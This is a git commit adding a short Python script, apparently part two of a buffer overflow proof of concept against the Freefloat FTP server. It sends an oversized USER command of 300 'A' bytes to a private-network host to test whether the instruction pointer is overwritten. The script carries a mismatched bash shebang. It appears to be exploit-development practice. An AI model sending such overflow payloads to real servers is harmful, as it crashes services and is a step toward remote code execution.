fd71a8acb5ec5c7ac4ea7904119a387f5236f79e
vry4n <46062162+vry4n@users.noreply.github.com>
2020-10-11 01:03:56 -0600

    Create BoF-Freefloat-2.py

---
+++ BoF-Freefloat-2.py
@@ -0,0 +1,14 @@
+#!/bin/bash
+import socket
+
+# Part 2 of proof of concept by Vry4n
+# This script is intended send all the buffer size in one packet, we need to see if EIP value gets overwritten 41414141 (AAAA)
+
+FUZZ = "A" * 300
+
+print("Fuzzing with {} bytes".format(len(FUZZ)))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect(("192.168.0.5", 21))
+s.recv(1024)
+s.send(b"USER " + FUZZ.encode() + b"\r\n")
+s.close()
